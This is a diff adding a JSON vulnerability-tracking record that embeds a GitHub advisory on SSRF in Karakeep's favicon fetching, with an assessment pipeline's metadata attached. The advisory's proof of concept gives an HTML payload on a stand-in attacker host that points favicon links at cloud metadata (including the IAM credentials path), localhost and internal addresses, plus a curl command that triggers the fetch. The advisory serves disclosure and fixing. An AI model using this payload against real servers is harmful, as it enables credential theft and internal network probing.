@@ -1,0 +1,55 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/135195424?v=4\", \"events_url\": \"https://api.github.com/users/CE2Sec/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/CE2Sec/followers\", \"following_url\": \"https://api.github.com/users/CE2Sec/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/CE2Sec/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/CE2Sec\", \"id\": 135195424, \"login\": \"CE2Sec\", \"node_id\": \"U_kgDOCA7rIA\", \"organizations_url\": \"https://api.github.com/users/CE2Sec/orgs\", \"received_events_url\": \"https://api.github.com/users/CE2Sec/received_events\", \"repos_url\": \"https://api.github.com/users/CE2Sec/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/CE2Sec/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/CE2Sec/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/CE2Sec\", \"user_view_type\": \"public\"}}], \"cve_id\": null, \"cvss\": {\"score\": null, \"vector_string\": null}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 0.0, \"vector_string\": null}, \"cvss_v4\": {\"score\": 7.1, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-918\", \"name\": \"Server-Side Request Forgery (SSRF)\"}], \"description\": \"## Summary\\n\\nThe `metascraper-logo-favicon` plugin makes HTTP requests to URLs extracted from attacker-controlled HTML without going through the application's `validateUrl()` SSRF protections. This allows any authenticated user to make the server fetch arbitrary internal URLs by bookmarking a page containing a crafted `<link rel=\\\"icon\\\">` tag.\\n\\n## Details\\n\\n### Protected path (correct)\\n\\nKarakeep implements comprehensive SSRF protections in `apps/workers/network.ts` (lines 12-222). The `validateUrl()` function blocks loopback, private, link-local, carrier-grade NAT, and reserved IP ranges. It resolves DNS before the fetch and checks all resolved IPs against the blacklist. This function is correctly used by `fetchWithProxy()` for the main bookmark URL fetch, image downloads, RSS feeds, and webhooks.\\n\\n### Unprotected path (vulnerability)\\n\\nAfter fetching the page HTML (with SSRF protection), the content is passed to a parse subprocess (`apps/workers/scripts/parseHtmlSubprocess.ts`). Inside this subprocess, `metascraper-logo-favicon` (v5.49.5) extracts favicon URLs from the HTML DOM by matching `<link rel=\\\"icon\\\">` elements and reading their `href` attribute.\\n\\nThe plugin then calls `reachable-url` (which wraps `got`) to verify each extracted URL. These HTTP requests bypass `validateUrl()` entirely:\\n\\n```typescript\\n// apps/workers/scripts/parseHtmlSubprocess.ts, lines 62-73\\nmetascraperLogo({\\n    gotOpts: {\\n      agent: {\\n        http: serverConfig.proxy.httpProxy\\n          ? new HttpProxyAgent(getRandomProxy(serverConfig.proxy.httpProxy))\\n          : undefined,\\n        https: serverConfig.proxy.httpsProxy\\n          ? new HttpsProxyAgent(getRandomProxy(serverConfig.proxy.httpsProxy))\\n          : undefined,\\n      },\\n    },\\n  }),\\n```\\n\\nOnly proxy agent configuration is provided. No URL validation hooks, no IP blacklist, no DNS resolution checks. The `got` HTTP client makes direct requests to whatever URLs are extracted from the HTML.\\n\\n### Data flow\\n\\n```\\n1. User creates bookmark → URL validated by validateUrl() ✓\\n2. Page HTML fetched → via fetchWithProxy() with SSRF protection ✓\\n3. HTML passed to parseHtmlSubprocess via stdin\\n4. metascraper-logo-favicon parses <link rel=\\\"icon\\\"> tags from HTML\\n5. Plugin calls reachable-url → got.get(faviconUrl) → NO validateUrl() ✗\\n6. Server makes HTTP GET to attacker-controlled internal URL\\n```\\n\\n### Comparison\\n\\nThe application explicitly protects the main URL fetch with `validateUrl()` (network.ts:136-222), which blocks all private/loopback IPs and resolves DNS before connecting. The recent commit history shows deliberate SSRF hardening (\\\"Stricter SSRF validation\\\" on 2025-11-02, allowlist feature on 2025-11-22). However, the metascraper plugins' internal HTTP requests are not routed through this validation.\\n\\n## PoC\\n\\n### 1. Set up a malicious page on a public URL\\n\\n```html\\n<!-- Hosted at https://attacker.example.com/ssrf.html -->\\n<html>\\n<head>\\n  <title>Innocent Page</title>\\n  <link rel=\\\"icon\\\" href=\\\"http://169.254.169.254/latest/meta-data/\\\" sizes=\\\"256x256\\\">\\n  <link rel=\\\"icon\\\" href=\\\"http://127.0.0.1:3000/api/v1/users/whoami\\\" sizes=\\\"128x128\\\">\\n  <link rel=\\\"icon\\\" href=\\\"http://192.168.1.1/admin\\\" sizes=\\\"64x64\\\">\\n</head>\\n<body><p>Normal content</p></body>\\n</html>\\n```\\n\\n### 2. Create a bookmark via the API\\n\\n```bash\\ncurl -X POST http://localhost:3000/api/v1/bookmarks \\\\\\n  -H \\\"Authorization: Bearer YOUR_API_KEY\\\" \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\\"type\\\": \\\"link\\\", \\\"url\\\": \\\"https://attacker.example.com/ssrf.html\\\"}'\\n```\\n\\n### 3. Result\\n\\nThe main URL (`https://attacker.example.com/ssrf.html`) passes `validateUrl()` since it resolves to a public IP. After the HTML is fetched, `metascraper-logo-favicon` extracts the favicon URLs and calls `reachable-url`/`got` to verify them. The server makes HTTP GET requests to:\\n- `http://169.254.169.254/latest/meta-data/` (AWS IMDS)\\n- `http://127.0.0.1:3000/api/v1/users/whoami` (localhost)\\n- `http://192.168.1.1/admin` (internal network)\\n\\nThese requests bypass all SSRF protections.\\n\\nVerification: Monitor outbound network traffic from the karakeep container or check the logo field in the bookmark response.\\n\\n## Impact\\n\\n- **Cloud metadata access**: On AWS/GCP/Azure deployments, the server can be forced to fetch instance metadata (e.g., `http://169.254.169.254/latest/meta-data/iam/security-credentials/`) which may expose IAM credentials.\\n- **Internal service discovery**: Attacker can probe internal network services and ports by checking whether the favicon URL was reachable.\\n- **Redirect-based data leak**: If an internal service responds with a redirect, the final URL (potentially containing tokens or session data) is stored as the bookmark's logo field and visible to the attacker.\\n- **Bypass of explicit security controls**: The application's SSRF protections (IP blacklist, DNS resolution, redirect validation) are rendered ineffective for this code path.\\n\\n## Suggested Fix\\n\\n```diff\\n// apps/workers/scripts/parseHtmlSubprocess.ts\\n+ import { validateUrl } from \\\"network\\\";\\n+\\n+ // Create a got hook that validates URLs before requests\\n+ const ssrfHook = {\\n+   beforeRequest: [\\n+     async (options) => {\\n+       const result = await validateUrl(options.url.toString(), false);\\n+       if (!result.ok) {\\n+         throw new Error(`SSRF blocked: ${result.reason}`);\\n+       }\\n+     }\\n+   ]\\n+ };\\n+\\n  metascraperLogo({\\n      gotOpts: {\\n+       hooks: ssrfHook,\\n        agent: { ... },\\n      },\\n  }),\\n```\\n\\nAlternatively, run the parse subprocess in a network-restricted sandbox (network namespace, nsjail, or a Docker container with restricted networking).\", \"ghsa_id\": \"GHSA-7rx4-c5vx-g8w3\", \"github_reviewed_at\": \"2026-05-14T18:26:02Z\", \"html_url\": \"https://github.com/advisories/GHSA-7rx4-c5vx-g8w3\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-7rx4-c5vx-g8w3\"}], \"nvd_published_at\": null, \"published_at\": \"2026-05-14T18:26:02Z\", \"references\": [\"https://github.com/karakeep-app/karakeep/security/advisories/GHSA-7rx4-c5vx-g8w3\", \"https://github.com/karakeep-app/karakeep/pull/2763\", \"https://github.com/karakeep-app/karakeep/commit/3dc321e7d49aa3a1a2493637fb2ee21616fe5fd9\", \"https://github.com/karakeep-app/karakeep/releases/tag/v0.32.0\", \"https://github.com/advisories/GHSA-7rx4-c5vx-g8w3\"], \"repository_advisory_url\": \"https://api.github.com/repos/karakeep-app/karakeep/security-advisories/GHSA-7rx4-c5vx-g8w3\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/karakeep-app/karakeep\", \"summary\": \"Karakeep SDK has SSRF via metascraper-logo-favicon that bypasses validateUrl protections\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-14T18:26:04Z\", \"url\": \"https://api.github.com/advisories/GHSA-7rx4-c5vx-g8w3\", \"vulnerabilities\": [{\"first_patched_version\": \"0.32.0\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"@karakeep/sdk\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 0.31.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-7rx4-c5vx-g8w3",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "@karakeep/sdk: <= 0.31.0"
+    ],
+    "authentication_required": true,
+    "cves": [],
+    "cvss_score": 7.1,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "@karakeep/sdk"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:52:02.411770Z",
+  "provenance": {
+    "content_sha256": "cb16087b2268c49891e8869cfc9d5ebf4779568b4175a048a927554535a64492",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-14T18:26:02Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-7rx4-c5vx-g8w3",
+  "status": "active",
+  "title": "Karakeep SDK has SSRF via metascraper-logo-favicon that bypasses validateUrl protections",
+  "updated_at": "2026-05-14T18:26:04Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-7rx4-c5vx-g8w3"
+}
